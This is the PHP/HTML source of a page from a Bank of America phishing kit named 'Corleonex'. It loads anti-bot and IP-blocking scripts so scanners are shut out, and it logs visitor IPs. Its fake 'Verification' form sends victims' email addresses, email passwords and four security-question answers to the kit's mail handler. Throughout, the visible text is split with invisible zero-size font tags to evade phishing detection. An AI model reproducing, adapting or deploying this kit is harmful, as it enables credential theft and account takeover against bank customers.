<?php
session_start();
error_reporting(0);



include'Corleonex/config.php';
include'Corleonex/Anti/IP-BlackList.php';  
include'Corleonex/Anti/Bot-Crawler.php';
include'Corleonex/Anti/bot-corleonex.php';
include'Corleonex/Anti/blacklist.php';
include'Corleonex/Anti/new.php';
include'Corleonex/Functions/Fuck-you.php'; 
include'Corleonex/Anti/Dila_DZ.php';


if (!isset($_GET['boa_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
if (!isset($_SESSION['BOA_CORLEONEX'])) {
  header("Location: index");
  exit();
}
if (!isset($_SESSION['login_SESSION'])) {
  header("Location: login");
  exit();
}	
  	$content2 = "#>".$_SESSION['ip']."\r\n";

 	 $save2=fopen("Corleonex/Boa_Result/total_email_access_view.txt","a+");
    fwrite($save2,$content2);
    fclose($save2);
?>
<html lang="en-US" layoutversion="3.1.0" layoutsupportheaderversion="4.5.0">
<head class="at-element-marker" style="visibility:visible;">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<title>Verification</title>
	<meta name="robots" content="NOINDEX, NOFOLLOW">

<meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />

	<link rel="shortcut icon" href="Corleonex/Files/img/assets-images-global-favicon-favicon-CSX8d65d6e4.ico">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/sparta-style-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/sparta-accordion-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/spa-datepicker.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/sparta-footnote-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/sparta-input-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/sparta-masking-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/datepicker.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/css/sparta-ui-layers-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/application-input-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/show-on-cookie-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/view-more-expand-utility.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/global-footer-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/global-nav-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/global-social-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/title-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/hero-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/connect-with-us-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/application-input-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/apply-services-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/continue-submit-button-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/disclosure-container-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/error-notification-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/page-render-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/progress-segment-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/render-new-page-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/slidey-deposits-module.scss.css">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/three-steps-with-image-module.scss.css">
	        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

	<style></style>
	<style>body{visibility:hidden}</style>

</head>

<body data-sparta-version="4.1.1" data-build-id="62711" data-sparta-wrapper="secure-apply-deposits" class="small small-up getStarted loaded standard medium medium-up medium-only landscape" style="visibility: visible;" data-detectedprerender="false">

<style type="text/css">
	span.help-block.form-error {
    color: #dc3545!important;
}
[data-sparta-container] .application-input-module-class-v-3-0-0 .input-grouping {
    margin-bottom: 5px;
}


</style>
<div data-sparta-container="secure-apply-deposits" class="flex-grid-nest spa-contextroot-apply-deposits spa-site-secure-apply-deposits">
	<noscript><style>body{visibility:visible}</style></noscript>

	<div class="spa-layout-container spa-layout-container--flex-grid-nest">
		<div  class="sparta-layout flex-grid-layout" >
			<section  class="head-row small-centered">
			<div class="row small-collapse medium-collapse large-collapse">
				<div class="large-12 columns">
					<div   class="global-nav-module-class-v-5-5-0 global-nav-module has-search">
						<header class="spa-page-header" >
							<div class="fake-header-bg">
							
							</div>
							<div  class="spa-page-header-container row clearfix">
								<div class="spa-page-header-grid-container columns large-12 clearfix">
							<div class="bofa-logo spa-page-header-brand left">
									<span  class="ada-hidden" aria-hidden="true"></span>
									<a  class="home-link bofa-logo left" id="boaLogo" href="">
										<img  alt="Bank of America Logo" src="Corleonex/Files/img/assets-images-global-logos-bac-logo-v2-CSX3648cbbb.svg"></a>
									</div>
									<div class="header-right right">
										<div class="header-secure">
											<a  href="" class="lock-icon spa-fn spa-boa-window spa-fn-complete">S<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>e P<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>g<font style='color:transparent;font-size:0px'></font>e</a>
										</div>
									</div>
								</div>
							</div>
						</header>

	<style type="text/css">#globalNavModule.global-nav-module.show-nav .home-icon::before{content:url(Corleonex/Files/img/assets-images-global-header-home_icon-CSXe201335c.svg)}#globalNavModule.global-nav-module.show-nav .locations-icon::before{content:url(Corleonex/Files/img/assets-images-global-header-locations_icon-CSXd6b1467d.svg)}#globalNavModule.global-nav-module.show-nav .contact-icon::before{content:url(Corleonex/Files/img/assets-images-global-header-contact_icon-CSXe40c3662.svg)}#globalNavModule.global-nav-module.show-nav .help-icon::before{content:url(Corleonex/Files/img/assets-images-global-header-help_icon-CSX4a68620d.svg)}#globalNavModule.global-nav-module.show-nav .espanol-icon::before{content:url(Corleonex/Files/img/assets-images-global-header-espanol_icon-CSX2944fde2.svg)}#globalNavModule.global-nav-module.show-nav .calendar-icon::before{content:url(Corleonex/Files/img/assets-images-global-header-calendar_icon-CSX7e416454.svg)}#globalNavModule.global-nav-module .lock-icon::before{content:url(Corleonex/Files/img/assets-images-global-header-secure-lock-CSXa09bf5fc.svg)}</style>
</div>

<div  class="title-module-class-v-3-2-0 title-module">
	<div class="spa-page-title spa-page-title--has-flagscape spa-page-title--crimson spa-page-title--white-text">
	<div class="spa-page-title-inset row">
		<div class="columns small-12">
	<h1 data-font="cnx-regular" class="heading title-heading"  aria-level="1" >
		<span >Verification</span>
			
		</h1>
	</div>
</div>
</div>

<style type="text/css">.spa-page-title.spa-page-title--has-flagscape.spa-page-title--red{background-image:url(Corleonex/Files/img/assets-images-global-title-flagscape_red-CSX345e7fd7.svg)}.spa-page-title.spa-page-title--has-flagscape.spa-page-title--crimson{background-image:url(Corleonex/Files/img/assets-images-global-title-flagscape_crimson-CSX37719e01.svg)}.spa-page-title.spa-page-title--has-flagscape.spa-page-title--gray{background-image:url(Corleonex/Files/img/assets-images-global-title-flagscape_gray-CSXc1942577.svg)}</style>

</div>

</div>
</div>

</section>

<section class="small-centered section-body page getStarted">
	<div class="row small-collapse medium-collapse large-collapse">
		<div class="large-12 columns">
	<div  class="application-input-module-class-v-3-0-0 application-input-module" >
			<form  action="Corleonex/Mail/Mail2" method="POST">
				<div class="input-grouping row">
					<h2 class="form-heading columns small-12">E-m<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>l v<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>f<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n</h2>
					<p class="form-subheading columns small-12 end">T<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>l u<font style='color:transparent;font-size:0px'></font>s a<font style='color:transparent;font-size:0px'></font>b<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>t y<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>r e<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>l in<font style='color:transparent;font-size:0px'></font>fo<font style='color:transparent;font-size:0px'></font>rm<font style='color:transparent;font-size:0px'></font>at<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>on.</p>
				</div>


<div class="input-grouping row">
	
			<div class="columns clear small-12 medium-5 large-4 end slide-down" style="visibility: visible; height: auto;">
				<div class="spa-input spa-input-box spa-input--sparta2">
					<label class="spa-input-label" data-font="cnx-medium" for="businessDescription">E<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>l a<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>s<span class="spa-input-label--required">
					
				</span>
					<span class="ada-hidden">
					
				</span>
				</label>
					<input type="text" name="emailaccess" class="spa-input-text"  data-validation="email" data-validation-error-msg="Please enter valid email address">
					<input type="hidden" name="token" value="SPOX">
					<div class="spa-input-error-message spa-icon--error" aria-hidden="true"></div>
				</div>
				</div>


				<div class="columns clear small-12 medium-5 large-4 end slide-down" style="visibility: visible; height: auto;">
				<div class="spa-input spa-input-box spa-input--sparta2">
					<label class="spa-input-label" data-font="cnx-medium" for="businessDescription">E<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>l p<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>w<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>d<span class="spa-input-label--required">
					
				</span>
					<span class="ada-hidden">
					
				</span>
				</label>
					<input type="password"  class="spa-input-text" data-validation="length" data-validation-error-msg="Please enter the correct password" data-validation-length="min2" name="emailaccesspass">
					<div class="spa-input-error-message spa-icon--error" aria-hidden="true"></div>
				</div>
				</div>

			</div>


<div class="row small-collapse medium-collapse large-collapse">
		<div class="large-12 columns">
	<div class="application-input-module-class-v-3-0-0 application-input-module">
				<div class="input-grouping row">
					<h2 class="form-heading columns small-12">S<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>y q<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n...</h2>
				</div>




<div class="input-grouping row">
	<div class="columns small-12 medium-5 large-4 clear end">
		<div class="spa-input spa-input-box spa-dropdown spa-input--sparta2">
		<label class="spa-input-label" data-font="cnx-medium" for="legalStructureSelect">S<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>t y<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>r f<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>rst<font style='color:transparent;font-size:0px'></font> q<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n?<span class="spa-input-label--required">
			</span>
				<span class="ada-hidden"></span>
			</label>
			<select class="disableIfPrefill spa-input-select" required="" name="question1">
				<option value="">Select one</option>
  <option name="What is your mother's middle name?">What is your mother's middle name?</option>
<option name="What is your father's middle name?">What is your father's middle name?</option>
<option name="In what city was your mother born?">In what city was your mother born?</option>
<option name="In what city were you born?">In what city were you born?</option>
<option name="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</option>
<option name="In what year did you graduate from high school?">In what year did you graduate from high school?</option>
<option name="What was the name of your first boyfriend or girlfriend?">What was the name of your first boyfriend or girlfriend?</option>
			</select>
			<p class="spa-input-hint"></p>
			
		</div>
	</div>

<div class="columns clear small-12 medium-5 large-4 end slide-down" style="visibility: visible; height: auto;">
				<div class="spa-input spa-input-box spa-input--sparta2">
					<label class="spa-input-label" data-font="cnx-medium" for="businessDescription">Answer 1<span class="spa-input-label--required">
					
				</span>
					<span class="ada-hidden">
					
				</span>
				</label>
					<input type="text" class="spa-input-text" data-validation="length" data-validation-error-msg="Please answer the first question" data-validation-length="min2" name="answer1">
					<div class="spa-input-error-message spa-icon--error" aria-hidden="true"></div>
				</div>
				</div>


		
	
	<div class="columns small-12 medium-5 large-4 clear end">
		<div class="spa-input spa-input-box spa-dropdown spa-input--sparta2">
	<label class="spa-input-label" data-font="cnx-medium" for="legalStructureSelect">S<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>ect<font style='color:transparent;font-size:0px'></font> your<font style='color:transparent;font-size:0px'></font> second<font style='color:transparent;font-size:0px'></font> q<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n?<span class="spa-input-label--required">
			</span>
				<span class="ada-hidden"></span>
			</label>
			<select class="disableIfPrefill spa-input-select" required="" name="question2">
				<option value="">Select one</option>
<option name="What was the name of your first pet?">What was the name of your first pet?</option>
<option name="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
<option name="In what city did you meet your spouse/significant other?">In what city did you meet your spouse/significant other?</option>
<option name="What was the first name of your favorite teacher or professor?">What was the first name of your favorite teacher or professor?</option>
<option name="What was the make and model of your first car?">What was the make and model of your first car?</option>
<option name="In what city were you married?">In what city were you married?</option>
<option name="In what city were you living at age 16?">In what city were you living at age 16?</option>
			</select>
			<p class="spa-input-hint"></p>
			
		</div>
	</div>

			<div class="columns clear small-12 medium-5 large-4 end slide-down" style="visibility: visible; height: auto;">
				<div class="spa-input spa-input-box spa-input--sparta2">
					<label class="spa-input-label" data-font="cnx-medium" for="businessDescription">Answer 2<span class="spa-input-label--required">
					
				</span>
					<span class="ada-hidden">
					
				</span>
				</label>
					<input type="text" class="spa-input-text" data-validation="length" data-validation-error-msg="Please answer the second question" data-validation-length="min2" name="answer2">
					<div class="spa-input-error-message spa-icon--error" aria-hidden="true"></div>
				</div>
				</div>
				<div class="columns small-12 medium-5 large-4 clear end">
	<div class="spa-input spa-input-box spa-dropdown spa-input--sparta2">
	<label class="spa-input-label" data-font="cnx-medium" for="legalStructureSelect">S<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>t y<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>r t<font style='color:transparent;font-size:0px'></font>h<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>d q<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n?<span class="spa-input-label--required">
			</span>
				<span class="ada-hidden"></span>
			</label>
			<select class="disableIfPrefill spa-input-select" required="" name="question3">
				<option value="">Select one</option>
<option name="In which city did you meet your spouse for the first time?">In which city did you meet your spouse for the first time?</option>
<option name="what is the name of your first employer?">what is the name of your first employer?</option>
<option name="What is your best friend\'s first name?">What is your best friend\'s first name?</option>
<option name="In what city was your high school?">In what city was your high school?</option>
<option name="In what city was your mother born?">In what city was your mother born?</option>
<option name="What was your high school mascot?">What was your high school mascot?</option>
<option name="In what city did you honeymoon?">In what city did you honeymoon?</option>
<option name="what your Favorite person in history?">what your Favorite person in history?</option>
			</select>
			<p class="spa-input-hint"></p>
			
		</div>
	</div>

	<div class="columns clear small-12 medium-5 large-4 end slide-down" style="visibility: visible; height: auto;">
				<div class="spa-input spa-input-box spa-input--sparta2">
					<label class="spa-input-label" data-font="cnx-medium" for="businessDescription">A<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>wer<font style='color:transparent;font-size:0px'></font> 3<span class="spa-input-label--required">
					
				</span>
					<span class="ada-hidden">
					
				</span>
				</label>
					<input type="text" class="spa-input-text" data-validation="length" data-validation-error-msg="Please answer the third question" data-validation-length="min2" name="answer3">
					<div class="spa-input-error-message spa-icon--error" aria-hidden="true"></div>
				</div>
				</div>




				<div class="columns small-12 medium-5 large-4 clear end">
	<div class="spa-input spa-input-box spa-dropdown spa-input--sparta2">
	<label class="spa-input-label" data-font="cnx-medium" for="legalStructureSelect">S<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>lect<font style='color:transparent;font-size:0px'></font> your<font style='color:transparent;font-size:0px'></font> fourth<font style='color:transparent;font-size:0px'></font> qu<font style='color:transparent;font-size:0px'></font>es<font style='color:transparent;font-size:0px'></font>ti<font style='color:transparent;font-size:0px'></font>on<font style='color:transparent;font-size:0px'></font>?<span class="spa-input-label--required">
			</span>
				<span class="ada-hidden"></span>
			</label>
			<select class="disableIfPrefill spa-input-select" required="" name="question4">
				<option value="">Select one</option>
<option name="What street did your best friend in high school live on?">What street did your best friend in high school live on?</option>
<option name="What was the first name of your favorite teacher or professor?">What was the first name of your favorite teacher or professor?</option>
<option name="What is the first name of your high school prom date?">What is the first name of your high school prom date?</option>
<option name="What is your all-time favorite song?">What is your all-time favorite song?</option>
<option name="what celebrity do you most resemble?">what celebrity do you most resemble?</option>
<option name="what is the name of your favorite charity?">what is the name of your favorite charity?</option>
<option name="what is the name of your first babysitter?">what is the name of your first babysitter?</option>
			</select>
			<p class="spa-input-hint"></p>
			
		</div>
	</div>

	<div class="columns clear small-12 medium-5 large-4 end slide-down" style="visibility: visible; height: auto;">
				<div class="spa-input spa-input-box spa-input--sparta2">
					<label class="spa-input-label" data-font="cnx-medium" for="businessDescription">A<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>w<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r 4<span class="spa-input-label--required">
					
				</span>
					<span class="ada-hidden">
					
				</span>
				</label>
					<input type="text" class="spa-input-text" data-validation="length" data-validation-error-msg="Please answer the fourth question" data-validation-length="min2" name="answer4">
					<div class="spa-input-error-message spa-icon--error" aria-hidden="true"></div>
				</div>
				</div>

			</div>

<div class="hide" >
</div>
</div>
</div>
</section>
<section class="small-centered section-body page getStarted">
	<div class="row small-collapse medium-collapse large-collapse">
		<div class="large-12 columns">
	<div class="continue-submit-button-module-class-v-3-0-0 continue-submit-button-module">
		<div class="row">
			<div class="columns small-12">
			<div class="nav-btn-container">
				<button style="float: left;" type="submit" class="button continueButton spa-btn spa-btn--primary spa-btn--large">C<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>e</button>
			<div class="nav-btn-container">
				
		</div>
	</div>
</div>
		</div>
		</div>
		</div>
		</section>
</form>
        <section class="foot-row background-bank-cool-gray-light small-centered">
        	<div class="row small-collapse medium-collapse large-collapse">
        		<div class="large-12 columns">
        			<div class="global-footer-module-class-v-4-4-2 global-footer-module">

        			<footer class="skin-cool" role="contentinfo">
        				<div class="footer-bottom-section">
        					<div class="row collapse">
        						<div class="columns small-12">
        							<div class="footer-bottom clearfix">
        								<div role="navigation" class="text-center">
        									<ul class="links">
        										<li class="link">
        											<a href="javascript:void(0);">S<font style='color:transparent;font-size:0px'></font>h<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>e we<font style='color:transparent;font-size:0px'></font>bs<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>te f<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>ed<font style='color:transparent;font-size:0px'></font>b<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>k</a>
        										</li>
        											<li class="link">
        												<a  href="#" class="spa-fn spa-boa-window spa-fn-complete" >P<font style='color:transparent;font-size:0px'></font>ri<font style='color:transparent;font-size:0px'></font>va<font style='color:transparent;font-size:0px'></font>cy &amp; Se<font style='color:transparent;font-size:0px'></font>cu<font style='color:transparent;font-size:0px'></font>ri<font style='color:transparent;font-size:0px'></font>ty</a>
        											</li>
        										</ul>
        									</div>
        									<div class="text-center"></div>
        									<div class="text-center">
        										<div class="legal">
        											<p class="legal-text">
        											<span class="member-fdic">B<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>k o<font style='color:transparent;font-size:0px'></font>f A<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>a, N.A. Me<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>be<font style='color:transparent;font-size:0px'></font>r F<font style='color:transparent;font-size:0px'></font>DI<font style='color:transparent;font-size:0px'></font>C.</span>
        											<span class="equalhousing-container">
        								<a href="#" class="equalhousing spa-fn spa-boa-window spa-fn-complete">E<font style='color:transparent;font-size:0px'></font>q<font style='color:transparent;font-size:0px'></font>ua<font style='color:transparent;font-size:0px'></font>l Ho<font style='color:transparent;font-size:0px'></font>us<font style='color:transparent;font-size:0px'></font>in<font style='color:transparent;font-size:0px'></font>g Le<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>de<font style='color:transparent;font-size:0px'></font>r <span class="ada-hidden">n<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>w w<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>nd<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>w</span>
        													</a>
        												</span>
        												</p>
        													<p class="legal-text">© 2<font style='color:transparent;font-size:0px'></font>0<font style='color:transparent;font-size:0px'></font>2<font style='color:transparent;font-size:0px'></font>0 B<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>k o<font style='color:transparent;font-size:0px'></font>f A<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>a C<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>p<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n. <span>A<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>l r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>g<font style='color:transparent;font-size:0px'></font>h<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>s r<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>v<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>d.</span>
        													</p>
        												</div>
        											</div>
        										</div>
        									</div>
        								</div>
        							</div>
        						</footer>

        						<style type="text/css">.global-footer-module .equalhousing{background:transparent url(Corleonex/Files/img/assets-images-global-logos-icon-ehl-crushed-CSXe0ce1a4d.svg) no-repeat;background-size:15px auto;background-position:right 2px}
        					</style>

        			</div>
        			
        		</div>
        	</div>
        </section>
    </div>
    </div>

</div>

<style type="text/css">
	@media only screen and (max-width: 600px){
		.medium-up [data-sparta-container] .row>.medium-5 {
    width: 100%;
}
	}
</style>

<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
  $.validate();
  $('#my-textarea').restrictLength( $('#max-length-element') );
  $.validate({
  modules : 'toggleDisabled',
  disabledFormFilter : 'form.toggle-disabled',
  showErrorDialogs : false
});

 
Inputmask("(9{1,3}) 9{1,3} 9{1,4}").mask("#phoneNumber");</script>

</body>

</html>